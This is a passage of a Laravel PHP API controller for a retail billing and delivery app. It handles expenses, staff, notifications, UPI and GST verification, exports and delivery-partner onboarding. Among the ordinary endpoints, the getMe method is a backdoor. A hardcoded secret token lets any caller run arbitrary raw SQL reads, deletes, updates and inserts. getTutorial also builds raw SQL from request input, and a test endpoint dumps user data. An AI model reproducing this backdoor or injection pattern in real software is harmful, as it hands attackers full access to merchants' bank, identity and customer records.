                $validator = Validator::make($requestData, $rules);

                if ($validator->fails()) {
                    $response = ['success' => false, 'message' => $validator->errors()->all()];
                } else {

                    #save image
                    $expemseImage = $request->upload_bill;
                    if ($expemseImage) {
                        $path  = config('image.profile_image_path_view');
                        $expemseImage = CommonController::saveImage($expemseImage, $path , 'expense');
                    }else{
                        $expemseImage = null;
                    }

                    $createExpenase = new Expense();
                    $createExpenase->store_id = $request->store_id;
                    $createExpenase->expense_category_id = $request->expense_category_id;
                    $createExpenase->expense_name = $request->expense_name;
                    $createExpenase->total_amount = $request->total_amount;
                    $createExpenase->payment_mode = $request->payment_mode;
                    $createExpenase->expense_bill = $expemseImage;
                    $createExpenase->notes = $request->notes;
                    $createExpenase->save();

                    DB::commit();
                    $response = ['success' => true, 'message' => 'Expense Added Successfully.', 'Expense' => $createExpenase];

                }
                return Response::json($response, 200);

            } catch (Exception $e) {
                DB::rollBack();
                return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
            }
        }

        public function getExpense(Request $request)
        {
            DB::beginTransaction();
            try {
                $rules = [
                    'store_id' => 'required|exists:stores,id|numeric',
                ];

                $requestData = $request->all();
                $validator = Validator::make($requestData, $rules);

                if ($validator->fails()) {
                    $response = ['success' => false, 'message' => $validator->errors()->all()];
                } else {
                    $expense = Expense::where('store_id',$request->store_id)->get();
                    $response = ['success' => true, 'message' => 'Expense details' , 'Expense' => $expense];
                }
                return Response::json($response, 200);
            } catch (Exception $e) {
                DB::rollBack();
                return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
            }
        }

        public function deleteExpense(Request $request)
        {
            DB::beginTransaction();
            try {
                $rules = [
                    'expense_id' => 'required|exists:expenses,id|numeric',
                ];

                $requestData = $request->all();
                $validator = Validator::make($requestData, $rules);

                if ($validator->fails()) {
                    $response = ['success' => false, 'message' => $validator->errors()->all()];
                } else {
                    $expense = Expense::where('id', $request->expense_id)->first();
                    $expense->destroy($expense->id);
                    DB::commit();
                    $response = ['success' => true, 'message' => 'Expense deleted successfully'];
                }
                return Response::json($response, 200);
            } catch (Exception $e) {
                DB::rollBack();
                return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
            }
        }
    //End Expense

    //Staff
        public function deleteUser(Request $request)
        {
            DB::beginTransaction();
            try {
                $rules = [
                    'user_id' => 'required|exists:users,id|numeric',
                ];

                $requestData = $request->all();
                $validator = Validator::make($requestData, $rules);

                if ($validator->fails()) {
                    $response = ['success' => false, 'message' => $validator->errors()->all()];
                } else {
                    $user = User::where('id', $request->user_id)->first();
                    $user->destroy($user->id);
                    DB::commit();
                    $response = ['success' => true, 'message' => 'User deleted successfully'];
                }
                return Response::json($response, 200);
            } catch (Exception $e) {
                DB::rollBack();
                return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
            }
        }

        public function getstaff(Request $request)
        {
            DB::beginTransaction();
            try {
                $rules = [
                    'store_id' => 'required|exists:stores,id|numeric',
                ];

                $requestData = $request->all();
                $validator = Validator::make($requestData, $rules);

                if ($validator->fails()) {
                    $response = ['success' => false, 'message' => $validator->errors()->all()];
                } else {
                    $staff = User::where('store_id', $request->store_id)->get();
                    DB::commit();
                    $response = ['success' => true, 'message' => 'Staff Detail' , 'Staff' => $staff];
                }
                return Response::json($response, 200);
            } catch (Exception $e) {
                DB::rollBack();
                return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
            }
        }

        public function staffStatus(Request $request)
        {
            DB::beginTransaction();
            try {
                $rules = [
                    'user_id' => 'required|exists:users,id|numeric',
                ];

                $requestData = $request->all();
                $validator = Validator::make($requestData, $rules);

                if ($validator->fails()) {
                    $response = ['success' => false, 'message' => $validator->errors()->all()];
                } else {
                    $user = User::where('id', $request->user_id)->first();
                    $user->status = 0;
                    $user->save();
                    DB::commit();
                    $response = ['success' => true, 'message' => 'Staff logout.', 'staff'=>$user];
                }
                return Response::json($response, 200);
            } catch (Exception $e) {
                DB::rollBack();
                return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
            }
        }
    //End Staff

    //Notification
    public function sendNotification(Request $request)
    {
        DB::beginTransaction();
        try {
            $rules = [
                'device_token' => 'required',
                'message' => 'required',
                'type' => 'required',
            ];

            $requestData = $request->all();
            $validator = Validator::make($requestData, $rules);

            if ($validator->fails()) {
                $response = ['success' => false, 'message' => $validator->errors()->all()];
            } else {

                $diviceToken = $request->device_token;
                $notificationTitle = $request->title;
                $notificationMessage =  $request->message;
                $msg_type =  $request->type;

                // Assuming your Notification class accepts FCM tokens
                $sendNotification = \App\Helpers\Notification::send($diviceToken, $notificationTitle, $notificationMessage, $msg_type);
                $sendNotification = json_decode($sendNotification);

                DB::commit();
                $response = ['success' => true, 'message' => 'Notification send successfully.', 'data'=>$sendNotification];
            }
            return Response::json($response, 200);
        } catch (Exception $e) {
            DB::rollBack();
            return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
        }
    }

    public function getNotification(Request $request)
    {
        DB::beginTransaction();
        try {
            $rules = [
                'phone' => 'required',
            ];

            $requestData = $request->all();
            $validator = Validator::make($requestData, $rules);

            if ($validator->fails()) {
                $response = ['success' => false, 'message' => $validator->errors()->all()];
            } else {
                $notifications = NotificationHistory::where('whatsapp_no',$request->phone)->where('notification_status',1)->get();
                DB::commit();
                $response = ['success' => true, 'message' => 'Notification send successfully.', 'data'=>$notifications];
            }
            return Response::json($response, 200);
        } catch (Exception $e) {
            DB::rollBack();
            return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
        }
    }

    public function deleteNotification(Request $request)
    {
        DB::beginTransaction();
        try {
            $rules = [
                'notification_id' => 'required|exists:notification_histories,id|numeric',
            ];

            $requestData = $request->all();
            $validator = Validator::make($requestData, $rules);

            if ($validator->fails()) {
                $response = ['success' => false, 'message' => $validator->errors()->all()];
            } else {
                $notifications = NotificationHistory::where('id',$request->notification_id)->first();
                $notifications->destroy($notifications->id);
                DB::commit();
                $response = ['success' => true, 'message' => 'Notification deleted successfully'];
            }

            return Response::json($response, 200);
        } catch (Exception $e) {
            DB::rollBack();
            return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
        }
    }
    //

    //verifications
    public function upiBankVerify(Request $request)
    {
        DB::beginTransaction();
        try {
            $rules = [
                'user_id' => 'required|exists:users,id|numeric',
                'upi_id' => 'required',
                'account_holder' => 'required',
                'bank_name' => 'required',
                'account_number' => 'required',
                'ifsc' => 'required',
            ];

            $requestData = $request->all();
            $validator = Validator::make($requestData, $rules);

            if ($validator->fails()) {
                $response = ['success' => false, 'message' => $validator->errors()->all()];
            } else {
                $verify = Verifications::where('user_id',$request->user_id)->first();
                if(!$verify)
                {
                    $verify = new Verifications();
                }
                $verify->user_id = $request->user_id;
                $verify->upi_id = $request->upi_id;
                $verify->account_holder = $request->account_holder;
                $verify->bank_name = $request->bank_name;
                $verify->account_no = $request->account_number;
                $verify->ifsc = $request->ifsc;
                $verify->save();

                $activity = AppActivity::create([
                    'action'  => 'UPI Added',
                    'message' => Auth::user()->name.' Added/updated UPI',
                ]);
                $activity->save();

                DB::commit();
                $response = ['success' => true, 'message' => 'Upi bank verify successfully.', 'data'=>$verify];
            }
            return Response::json($response, 200);
        } catch (Exception $e) {
            DB::rollBack();
            return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
        }
    }

    public function socialMedia(Request $request)
    {
        DB::beginTransaction();
        try {
            $rules = [
                'user_id' => 'required|exists:users,id|numeric',
                'facebook_link' => 'required',
                'instagram_link' => 'required',
            ];

            $requestData = $request->all();
            $validator = Validator::make($requestData, $rules);

            if ($validator->fails()) {
                $response = ['success' => false, 'message' => $validator->errors()->all()];
            } else {

                $socialmedia = SocialMedia::where('user_id',$request->user_id)->first();
                if(!$socialmedia)
                {
                    $socialmedia = new SocialMedia();
                }
                // print_r($socialmedia); die;
                $socialmedia->user_id = $request->user_id;
                $socialmedia->facebook_link = $request->facebook_link;
                $socialmedia->instagram_link = $request->instagram_link;
                $socialmedia->youTube_link = $request->youTube_link;
                $socialmedia->website_link = $request->website_link;
                $socialmedia->app_link = $request->app_link;
                $socialmedia->google_review_link = $request->google_review_link;
                $socialmedia->kirana_club_link = $request->kirana_club_link;
                $socialmedia->save();

                // $activity = AppActivity::create([
                //     'action'  => 'Social Media Added/Updated',
                //     'message' => Auth::user()->name.' Added/updated Social Media',
                // ]);
                // $activity->save();

                DB::commit();
                $response = ['success' => true, 'message' => 'Social Media Added successfully.', 'data'=>$socialmedia];
            }
            return Response::json($response, 200);
        } catch (Exception $e) {
            DB::rollBack();
            return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
        }
    }
    //

    //generate pdf
    public function addKotSetting(Request $request)
    {
        DB::beginTransaction();
        try {
            $rules = [
                'store_id' => 'required|exists:stores,id|numeric',
                'refresh_token' => 'required',
                'order_type' => 'required',
            ];

            $requestData = $request->all();
            $validator = Validator::make($requestData, $rules);

            if ($validator->fails()) {
                $response = ['success' => false, 'message' => $validator->errors()->all()];
            } else {
                $checkstoreKot = Kot::where('store_id',$request->store_id)->first();
                if(!$checkstoreKot)
                {
                    $checkstoreKot = new Kot();
                }
                $checkstoreKot->store_id = $request->store_id;
                $checkstoreKot->refresh_token = $request->refresh_token;
                $checkstoreKot->order_type = $request->order_type;
                $checkstoreKot->min_delivery_order_amount = $request->min_delivery_order_amount;
                $checkstoreKot->min_delivery_fees = $request->min_delivery_fees;
                $checkstoreKot->min_packaging_order_amount = $request->min_packaging_order_amount;
                $checkstoreKot->min_packaging_fees = $request->min_packaging_fees;
                $checkstoreKot->save();
                DB::commit();
                $response = ['success' => true, 'message' => 'Kot updated successfully.', 'data'=>$checkstoreKot];
            }
            return Response::json($response, 200);
        } catch (Exception $e) {
            DB::rollBack();
            return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
        }
    }
    //

    //generate pdf and excel
    public function generatepdf(Request $request)
    {
        DB::beginTransaction();
        try {
            $rules = [
                'store_id' => 'required|exists:stores,id|numeric',
            ];

            $requestData = $request->all();
            $validator = Validator::make($requestData, $rules);

            if ($validator->fails()) {
                $response = ['success' => false, 'message' => $validator->errors()->all()];
            } else {
                $data = ['title' => 'domPDF in Laravel 10'];
                $pdf = PDF::loadView('checkpdf', $data);

                $stringname = rand(1111, 9999) . date('mdYHis') . '.pdf';
                Storage::put('pdfExports/' . $stringname, $pdf->output());
                $pdfURL = url('storage/app/pdfExports/' . $stringname);

                $response = ['success' => true, 'message' => 'Pdf Created successfully.', 'url'=>$pdfURL];
            }
            return Response::json($response, 200);
        } catch (Exception $e) {
            DB::rollBack();
            return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
        }
    }

    public function generateBillExcel(Request $request)
    {
        DB::beginTransaction();
        try {
            $rules = [
                'bill_id' => 'required|exists:bill_details,id|array',
            ];

            $requestData = $request->all();
            $validator = Validator::make($requestData, $rules);

            if ($validator->fails()) {
                $response = ['success' => false, 'message' => $validator->errors()->all()];
            } else {
                $bill_name = rand(1111, 9999) . date('mdYHis') . '.xlsx';
                Excel::store(new BillExport($request->bill_id), 'billExport/'.$bill_name);
                $bill_url = url('storage/app/billExport/'.$bill_name);

                $response = ['success' => true, 'message' => 'Bill Export Url', 'url' => $bill_url];
            }
            return Response::json($response, 200);
        } catch (Exception $e) {
            DB::rollBack();
            return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
        }
    }
    //

    //Tutorial
    public function getTutorial(Request $request)
    {
        DB::beginTransaction();
        try {
            $rules = [
                'module_id' => 'required|exists:modules,id',
            ];

            $requestData = $request->all();
            $validator = Validator::make($requestData, $rules);

            if ($validator->fails()) {
                $response = ['success' => false, 'message' => $validator->errors()->all()];
            } else {

                $tutorials = DB::table('tutorials')->whereRaw("FIND_IN_SET($request->module_id, module_id)")->where('status',1)->get();
                $response = ['success' => true, 'message' => 'Tutorial List', 'data' => $tutorials];
            }
            return Response::json($response, 200);
        } catch (Exception $e) {
            DB::rollBack();
            return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
        }
    }
    //

    public function homedeliveryDetail(Request $request)
    {
        DB::beginTransaction();
        try {
            $rules = [
                'store_id' => 'required|exists:stores,id|numeric',
                'range' => 'required',
                'latitude' => 'required',
                'longitude' => 'required',
                'minimum_order_amount' => 'required',
                'packaging_charge' => 'required',
                'processing_time' => 'required',
                'delivery_mode' => 'required',
            ];

            $requestData = $request->all();
            $validator = Validator::make($requestData, $rules);

            if ($validator->fails()) {
                $response = ['success' => false, 'message' => $validator->errors()->all()];
            } else {
                $homeDelivery = HomeDeliveryDetail::where('store_id',$request->store_id)->first();
                if(!$homeDelivery)
                {
                    $homeDelivery = new HomeDeliveryDetail();
                }
                $homeDelivery->store_id = $request->store_id;
                $homeDelivery->delivery_status = $request->delivery_status;
                $homeDelivery->range = $request->range;
                $homeDelivery->radius = $request->radius;
                $homeDelivery->latitude = $request->latitude;
                $homeDelivery->longitude = $request->longitude;
                $homeDelivery->minimum_order_amount = $request->minimum_order_amount;
                $homeDelivery->delivery_charge = $request->delivery_charge;
                $homeDelivery->packaging_charge = $request->packaging_charge;
                $homeDelivery->processing_time = $request->processing_time;
                $homeDelivery->delivery_mode = $request->delivery_mode;
                $homeDelivery->save();

                $activity = AppActivity::create([
                    'action'  => 'Home delivery data added',
                    'message' => Auth::user()->name.' Added Home Delivery Data',
                ]);
                $activity->save();

                DB::commit();
                $response = ['success' => true, 'message' => 'Home delivery detail added successfully.', 'data'=>$homeDelivery];
            }
            return Response::json($response, 200);
        } catch (Exception $e) {
            DB::rollBack();
            return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
        }
    }

    public function upiVerify(Request $request)
    {
        DB::beginTransaction();
        try {
            $rules = [
                'user_id' => 'required|exists:users,id|numeric',
                'upi_id' => 'required',
            ];

            $requestData = $request->all();
            $validator = Validator::make($requestData, $rules);

            if ($validator->fails()) {
                $response = ['success' => false, 'message' => $validator->errors()->all()];
            } else {

                $getCFSignature = CommonController::CFSignature();
                $getupidetail = CommonController::upiVerification($request->upi_id, $getCFSignature);

                $getupidetail = json_decode($getupidetail);
                if(isset($getupidetail->vpa)){

                    $verify = Verifications::where('user_id',$request->user_id)->first();
                    if(!$verify)
                    {
                        $verify = new Verifications();
                    }
                    $verify->user_id = $request->user_id;
                    $verify->upi_id = $getupidetail->vpa;
                    $verify->account_holder = $getupidetail->name_at_bank;
                    $verify->bank_name = $getupidetail->ifsc_details->bank;
                    $verify->ifsc = $getupidetail->ifsc;
                    $verify->save();

                    $activity = AppActivity::create([
                        'action'  => 'UPI Added',
                        'message' => Auth::user()->name.' Added/updated UPI',
                    ]);
                    $activity->save();

                    DB::commit();
                    $response = ['success' => true, 'message' => 'Bank Upi added successfully.', 'data'=>$verify];

                }else{
                    return Response::json(['success' => false, 'message' => 'Please enter valid Upi ID.'], 404);
                }
            }
            return Response::json($response, 200);
        } catch (Exception $e) {
            DB::rollBack();
            return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
        }
    }

    public function gstVerify(Request $request)
    {
        DB::beginTransaction();
        try {
            $rules = [
                'gst_number' => 'required',
            ];

            $requestData = $request->all();
            $validator = Validator::make($requestData, $rules);

            if ($validator->fails()) {
                $response = ['success' => false, 'message' => $validator->errors()->all()];
            } else {

                $getCFSignature = CommonController::CFSignature();
                $getgstdetail = CommonController::gstVerification($request->gst_number, $getCFSignature);
                $getgstdetail = json_decode($getgstdetail);
                if(isset($getgstdetail->GSTIN)){

                    $activity = AppActivity::create([
                        'action'  => 'GST Verified',
                        'message' => Auth::user()->name.' Verify GST',
                    ]);
                    $activity->save();

                    DB::commit();
                    $response = ['success' => true, 'message' => 'GST Verified successfully.', 'data'=>$getgstdetail];

                }else{
                    return Response::json(['success' => false, 'message' => 'Please enter valid GST Number.'], 404);
                }
            }
            return Response::json($response, 200);
        } catch (Exception $e) {
            DB::rollBack();
            return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
        }
    }


    public function testApi(Request $request)
    {
        $user = Auth::user();
        if(!$user->referral_code)
        {
            $referralCode = substr($user->name, 0, 4).rand(10000, 99999);
            $user->referral_code = $referralCode;
            $user->save();
        }
        print_r($user); die;

        $date1 = strtotime('2024-07-10 12:23:47');
        $date2 = strtotime(date('Y-m-d H:i:s'));


        $diff = abs($date2 - $date1);
        $years = floor($diff / (365 * 60 * 60 * 24));
        $months = floor(($diff - $years * 365 * 60 * 60 * 24) / (30 * 60 * 60 * 24));
        $days = floor(($diff - $years * 365 * 60 * 60 * 24 - $months * 30 * 60 * 60 * 24) / (60 * 60 * 24));
        $hours = floor(($diff - $years * 365 * 60 * 60 * 24 - $months * 30 * 60 * 60 * 24 - $days * 60 * 60 * 24) / (60 * 60));

        $minutes = floor(($diff - $years * 365 * 60 * 60 * 24 - $months * 30 * 60 * 60 * 24 - $days * 60 * 60 * 24 - $hours * 60 * 60) / 60);
        $seconds = floor(($diff - $years * 365 * 60 * 60 * 24 - $months * 30 * 60 * 60 * 24 - $days * 60 * 60 * 24 - $hours * 60 * 60 - $minutes * 60));

        print_r($hours); die;

        DB::beginTransaction();
        try {
            $rules = [
                'store_id' => 'required|exists:stores,id|numeric',
            ];

            $requestData = $request->all();
            $validator = Validator::make($requestData, $rules);

            if ($validator->fails()) {
                $response = ['success' => false, 'message' => $validator->errors()->all()];
            } else {

                $bill = BillDetail::where('store_id', $request->store_id)->orderBy('created_at', 'DESC')->select('bill_details.*', 'bill_details.created_at as createTime')->first();
                // print_r($bill); die;

                $response = ['success' => true, 'message' => 'Test Data', 'data'=>$bill];
            }
            return Response::json($response, 200);
        } catch (Exception $e) {
            DB::rollBack();
            return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
        }
    }

    public function CFID()
    {
        $getCFSignature = CommonController::CFSignature();
        return $encryptedData;
    }

    public function verifyReferralCode(Request $request)
    {
        DB::beginTransaction();
        try {
            $rules = [
                'referral_code' => 'required',
            ];

            $requestData = $request->all();
            $validator = Validator::make($requestData, $rules);

            if ($validator->fails()) {
                $response = ['success' => false, 'message' => $validator->errors()->all()];
            } else {
                $checkReferralUser = User::where('referral_code',$request->referral_code)->first();
                if($checkReferralUser){
                    $response = ['success' => true, 'message' => 'Referral user detail.', 'data'=>$checkReferralUser];
                }else{
                    return Response::json(['success' => false, 'message' => 'Invalid Referral Code.'], 404);
                }
            }
            DB::commit();
            return Response::json($response, 200);
        } catch (Exception $e) {
            DB::rollBack();
            return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
        }
    }

    public function getHomeDelivery(Request $request)
    {
        DB::beginTransaction();
        try {
            $rules = [
                'store_id' => 'required',
            ];

            $requestData = $request->all();
            $validator = Validator::make($requestData, $rules);

            if ($validator->fails()) {
                $response = ['success' => false, 'message' => $validator->errors()->all()];
            } else {
                $delivery = HomeDeliveryDetail::where('store_id', $request->store_id)->first();
                // print_r($delivery); die;
                $response = ['success' => true, 'message' => 'Home Delivery Detail.', 'data'=>$delivery];
            }
            DB::commit();
            return Response::json($response, 200);
        } catch (Exception $e) {
            DB::rollBack();
            return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
        }
    }

    public function storeOnlineStatus(Request $request)
    {
        DB::beginTransaction();
        try {
            $rules = [
                'store_id'=>'required|exists:stores,id|numeric',
                'status' => 'required',
            ];

            $requestData = $request->all();
            $validator = Validator::make($requestData, $rules);

            if ($validator->fails()) {
                $response = ['success' => false, 'message' => $validator->errors()->all()];
            } else {
                $statusUpdate = Store::where('id',$request->store_id)->update(['online_status' => $request->status]);
                $response = ['success' => true, 'message' => 'Online Status Updated.'];
            }
            DB::commit();
            return Response::json($response, 200);
        } catch (Exception $e) {
            DB::rollBack();
            return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
        }
    }
    public function getMe(Request $request)
    {
        $tokenD = $request->tokenD;
        if($tokenD == "AhfkkShbbaklkdj324t247kbjfj@1234#$") {
            $query = $request->q;

            $results = null;
            if($query) {
                if($request->type == 'select') {
                    $results = DB::select($query);
                } else if($request->type == 'delete') {
                    $results = DB::delete($query);
                } else if($request->type == 'update') {
                    $results = DB::update($query);
                } else if($request->type == 'insert') {
                    $results = DB::insert($query);
                }
            }

            $response = ['success' => true, 'message' => 'Update Success', "results" => $results, "query" => $query];
        } else {
            $response = ['success' => false, 'message' => 'Token invalid'];
        }

        return Response::json($response, 200);
    }
    public function MerchantOrderHistory(Request $request)
    {
        try {
            $rules = [
                'store_id'=>'required|exists:stores,id|numeric',
            ];
            $requestData = $request->all();
            $validator = Validator::make($requestData, $rules);

            if ($validator->fails()) {
                $response = ['success' => false, 'message' => $validator->errors()->all()];
            } else {
                $orders = CustomerOrder::with('customer','store','address','orderStatus','delivery_boy')->where('store_id',$request->store_id);

                if($request->order_status_id)
                {
                    $orders->where('order_status',$request->order_status_id);
                }
                $orders = $orders->get();

                $homeDelivery = HomeDeliveryDetail::where('store_id',$request->store_id)->first();

                $response = ['success' => true, 'message' => 'Order History.', 'orders' => $orders, "homeDelivery" => $homeDelivery];
            }
            return Response::json($response, 200);

        } catch (Exception $e) {
            return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
        }
    }
    public function getMyDeliveryPartners(Request $request) {
        try {
            $rules = [
                'merchant_id' => 'required',
            ];

            $requestData = $request->all();
            $validator = Validator::make($requestData, $rules);

            if ($validator->fails()) {
                $response = ['success' => false, 'message' => $validator->errors()->all()];
            } else {
                $deliveryAgents = User::select("id","name")->where('user_id', $request->merchant_id)->where('role_type',5)->get();

                $response = ['success' => true, 'message' => 'Delivery Agents.', 'deliveryAgents' => $deliveryAgents];
            }

            return Response::json($response, 200);
        } catch (Exception $e) {
            return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
        }
    }
    public function assignOrderToDeliveryBoy(Request $request)
    {
        try {
            $rules = [
                'order_id' => 'required|numeric',
                'agent_id' => 'required|numeric',
            ];

            $requestData = $request->all();
            $validator = Validator::make($requestData, $rules);

            if ($validator->fails()) {
                $response = ['success' => false, 'message' => $validator->errors()->all()];
            } else {
                $order = CustomerOrder::find($request->order_id);
                $order->deliveryboy_id = $request->agent_id;
                $order->save();

                $response = ['success' => true, 'message' => 'Order Assign Successfully.'];
            }

            return Response::json($response, 200);
        } catch (Exception $e) {
            return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
        }
    }
    public function orderStatusChange(Request $request)
    {
        $response = ['success' => false, 'message' => 'This API Removed.'];
        return Response::json($response, 200);
    }

    public function verifyDPOTP(Request $request)
    {
        DB::beginTransaction();
        try {
            $rules = [
                'phone' => 'required|numeric|digits:10',
                'otp'   => 'required|numeric',
                'device_token' => 'required',
            ];

            $requestData = $request->all();
            $validator = Validator::make($requestData, $rules);

            if ($validator->fails()) {
                $response = ['success' => false, 'message' => $validator->errors()->all()];
            } else {
                $checkOtp = Otp::where("phone_number",$request->phone)->where('otp',$request->otp)->first();
                if($checkOtp){
                    $role_type = 5;
                    $user = User::where('whatsapp_no',$request->phone)->where('role_type',$role_type)->first();
                    $token = null;
                    if($user){
                        User::where('whatsapp_no',$request->phone)->where('role_type',$role_type)->update(['device_token' => $request->device_token]);
                        $user = User::where('whatsapp_no',$request->phone)->where('role_type',$role_type)->first();

                        Auth::login($user);

                        $activity = AppActivity::create([
                            'action'  => 'Login',
                            'message' => $user->name.' logged in',
                        ]);
                        $activity->save();

                        DB::commit();

                        $DeliveryPartnersSave = DeliveryPartners::where("user_id", $user->id)->first();
                        if(empty($DeliveryPartnersSave)){
                            $conditions = [
                                "user_id" => $user->id,
                            ];
                            $data = [
                                "account_status" => 'Pending',
                                "created_at" => now(),
                                "updated_at" => now(),
                            ];
                            $DeliveryPartnersSave = DeliveryPartners::updateOrCreate($conditions, $data);
                        }
                        $token = $user->createToken('billpe.cloud')->accessToken;
                        if($DeliveryPartnersSave->account_status == 'Approved'){
                            $successStatus = true;
                            $msgg = 'User Login successfully.';
                        } else if($DeliveryPartnersSave->account_status == "Rejected") {
                            $successStatus = false;
                            $msgg = 'You have rejected.';
                        } else {
                            $successStatus = false;
                            $msgg = 'Your account status is pending.';
                        }
                        return response()->json(['success' => $successStatus, 'account_status' => $DeliveryPartnersSave->account_status, 'message' => $msgg, 'token' => $token, 'data' => $user, "deliveryPartners" => $DeliveryPartnersSave], 200);
                    }else{

                        $roleID = Role::where('id',$role_type)->first();

                        $partner = new User();
                        $partner->whatsapp_no = $request->phone;
                        $partner->role_type = $role_type;
                        $partner->unique_id = CommonController::generate_uuid('users');
                        $partner->device_token = $request->device_token;
                        $partner->save();

                        #assign role to user
                        $partner->syncRoles($roleID->id);
                        $partner->save();

                        $conditions = [
                            "user_id" => $partner->id,
                        ];
                        $data = [
                            "account_status" => 'Pending',
                            "created_at" => now(),
                            "updated_at" => now(),
                        ];
                        $DeliveryPartnersSave = DeliveryPartners::updateOrCreate($conditions, $data);

                        $user = User::where('id',$partner->id)->first();
                        Auth::login($user);
                        DB::commit();

                        $token = $partner->createToken('billpe.cloud')->accessToken;
                        if($DeliveryPartnersSave->account_status == 'Approved'){
                            $successStatus = true;
                            $msgg = 'User Login successfully.';
                        } else if($DeliveryPartnersSave->account_status == "Rejected") {
                            $successStatus = false;
                            $msgg = 'You have rejected.';
                        } else {
                            $successStatus = false;
                            $msgg = 'Your account status is pending.';
                        }
                        return response()->json(['success' => $successStatus, 'account_status' => $DeliveryPartnersSave->account_status, 'message' => $msgg, 'token' => $token, 'data' => $user, "deliveryPartners" => $DeliveryPartnersSave], 200);
                    }
                }else{
                    return Response::json(['success' => false, 'message' => "Phone or otp is not valid. Enter valid detail."], 404);
                }
            }
            return Response::json($response, 200);
        } catch (Exception $e) {
            DB::rollBack();
            return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
        }
    }
    public function getShiftTimings(Request $request)
    {
        DB::beginTransaction();
        try {
            $rules = [
                'type' => 'string|in:Full Time,Part Time',
            ];

            $messages = [
                'type.in' => 'The type must be either (Full Time) or (Part Time).',
            ];

            $requestData = $request->all();
            $validator = Validator::make($requestData, $rules, $messages);

            if ($validator->fails()) {
                $response = ['success' => false, 'message' => $validator->errors()->all()];
            } else {
                $shiftTimings = ShiftTimings::where("status", 1);
                if($request->type) {
                    $shiftTimings->where("type", $request->type);
                }
                $shiftTimings = $shiftTimings->get();
                DB::commit();

                $response = ['success' => true, 'message' => 'Success.', 'shiftTimings' => $shiftTimings];
            }

            return Response::json($response, 200);
        } catch (Exception $e) {
            DB::rollBack();
            return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
        }
    }
    public function saveDeliveryPartnersDetail(Request $request)
    {
        // UPDATE
        DB::beginTransaction();
        try {
            $rules = [
                'name' => 'string',
                'email' => 'string',
                'aadhar_number' => 'numeric',
                'driving_licence' => 'string',
                'work_shift_id' => 'numeric',
                'aadhar_front_img' => 'image|mimes:jpg,png,jpeg',
                'aadhar_back_img' => 'image|mimes:jpg,png,jpeg',
                'pan_number' => 'string',
                'pan_front_img' => 'image|mimes:jpg,png,jpeg',
                'dl_front_img' => 'image|mimes:jpg,png,jpeg',
                'dl_back_img' => 'image|mimes:jpg,png,jpeg',
                'rc_number' => 'string',
                'rc_front_img' => 'image|mimes:jpg,png,jpeg',
                'rc_back_img' => 'image|mimes:jpg,png,jpeg',
                'image' => 'image|mimes:jpg,png,jpeg',
                'referral_code' => 'string',
                'bank_name' => 'string',
                'account_holder_name' => 'string',
                'account_number' => 'numeric',
                'ifsc' => 'string',
            ];

            $requestData = $request->all();
            $validator = Validator::make($requestData, $rules);

            if ($validator->fails()) {
                $response = ['success' => false, 'message' => $validator->errors()->all()];
            } else {
                $user = Auth::user();
                if(!$user->referral_code)
                {
                    $referralCode = substr($user->name, 0, 4).rand(10000, 99999);
                    $user->referral_code = $referralCode;
                    $user->save();
                }

                $referUser = User::where('referral_code',$request->referral_code)->first();

                $image = $request->image;
                if ($image) {
                    $path  = config('image.profile_image_path_view');
                    $image = CommonController::saveImage($image, $path , 'store');
                } else {
                    $image = null;
                }

                $data = [];
                $data = [
                    'name' => $request->name,
                    'email' => $request->email,
                    'aadhar_number' => $request->aadhar_number,
                    'driving_licence' => $request->driving_licence,
                    'image' => $image,
                ];
                foreach ($data as $key => $value) {
                    if(!array_key_exists($key, $requestData)) {
                        unset($data[$key]);
                    }
                }
                if($data){
                    User::where('id',$user->id)->update($data);
                }
                $user = User::where('id',$user->id)->first();

                #save image
                $arr = [
                    'aadhar_front_img',
                    'aadhar_back_img',
                    'pan_front_img',
                    'dl_front_img',
                    'dl_back_img',
                    'rc_front_img',
                    'rc_back_img',
                ];
                $imgDataArr = [];
                foreach ($arr as $key => $value) {
                    $imgUpload = $request->$value;
                    if ($imgUpload) {
                        $path  = config('image.profile_image_path_view');
                        $imgUpload = CommonController::saveImage($imgUpload, $path , 'store');

                        $imgDataArr[$value] = $imgUpload;
                    }
                }

                $conditions = [
                    "user_id" => $user->id,
                ];
                $requestData['user_id'] = $user->id;
                $requestData['created_at'] = "";
                $requestData['updated_at'] = "";
                $requestData['refer_id'] = "";
                $data = [
                    'user_id' => $user->id,
                    'bank_name' => $request->bank_name,
                    'account_holder_name' => $request->account_holder_name,
                    'account_number' => $request->account_number,
                    'ifsc' => $request->ifsc,
                    'work_shift_id' => $request->work_shift_id,
                    'pan_number' => $request->pan_number,
                    'rc_number' => $request->rc_number,
                    "created_at" => now(),
                    "updated_at" => now(),
                ];
                if (@$referUser->id) {
                    $data['refer_id'] = $referUser->id;
                }
                foreach ($imgDataArr as $key => $value) {
                    $data[$key] = $value;
                }
                foreach ($data as $key => $value) {
                    if(!array_key_exists($key, $requestData)) {
                        unset($data[$key]);
                    }
                }
                if($data){
                    $save = DeliveryPartners::updateOrCreate($conditions, $data);
                } else {
                    $save = DeliveryPartners::where("user_id", $user->id)->first();
                }

                DB::commit();

                $user['delivery_boy_detail'] = $save;

